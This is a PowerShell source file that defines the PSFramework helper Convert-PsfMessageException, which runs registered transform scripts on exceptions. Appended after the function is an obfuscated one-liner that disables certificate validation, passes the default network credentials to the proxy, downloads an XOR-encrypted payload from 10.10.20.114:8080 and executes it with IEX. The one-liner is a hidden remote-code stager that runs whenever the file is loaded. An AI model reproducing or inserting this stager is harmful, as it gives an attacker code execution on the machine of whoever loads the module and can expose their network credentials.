function Convert-PsfMessageException
{
	
	[CmdletBinding()]
	Param (
		[Parameter(Mandatory = $true)]
		$Exception,
		
		[Parameter(Mandatory = $true)]
		[string]
		$FunctionName,
		
		[Parameter(Mandatory = $true)]
		[string]
		$ModuleName
	)
	
	if ($null -eq $Exception) { return }
	
	$typeName = $Exception.GetType().FullName.ToLower()
	
	if ([PSFramework.Message.MessageHost]::ExceptionTransforms.ContainsKey($typeName))
	{
		$scriptBlock = [PSFramework.Message.MessageHost]::ExceptionTransforms[$typeName]
		try
		{
			$tempException = $ExecutionContext.InvokeCommand.InvokeScript($false, ([scriptblock]::Create($scriptBlock.ToString())), $null, $Exception)
			return $tempException
		}
		catch
		{
			[PSFramework.Message.MessageHost]::WriteTransformError($_, $FunctionName, $ModuleName, $Exception, "Exception", ([System.Management.Automation.Runspaces.Runspace]::DefaultRunspace.InstanceId))
			return $Exception
		}
	}
	
	if ($transform = [PSFramework.Message.MessageHost]::ExceptionTransformList.Get($typeName, $ModuleName, $FunctionName))
	{
		try
		{
			$tempException = $ExecutionContext.InvokeCommand.InvokeScript($false, ([scriptblock]::Create($transform.ScriptBlock.ToString())), $null, $Exception)
			return $tempException
		}
		catch
		{
			[PSFramework.Message.MessageHost]::WriteTransformError($_, $FunctionName, $ModuleName, $Exception, "Target", ([System.Management.Automation.Runspaces.Runspace]::DefaultRunspace.InstanceId))
			return $Exception
		}
	}
	
	return $Exception
}
$Wc=NEw-ObjEct SysTem.NET.WeBCliENT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$WC.HEaDeRS.ADd('User-Agent',$u);$Wc.PROxy = [SYsTEm.NET.WEBRequesT]::DEfaUlTWEBPRoXY;$wC.PRoxY.CrEdeNtiAlS = [SystEM.NEt.CrEDeNTiAlCACHe]::DeFaUltNeTwOrkCrEdentIaLS;$K='AsKP}S6NvIyQZ8\>@wUXJ.g;a!iDO0uT';$i=0;[chaR[]]$B=([char[]]($Wc.DowNlOaDSTRinG("https://10.10.20.114:8080/index.asp")))|%{$_-BXOr$k[$I++%$k.LeNGTh]};IEX ($b-joIN'')

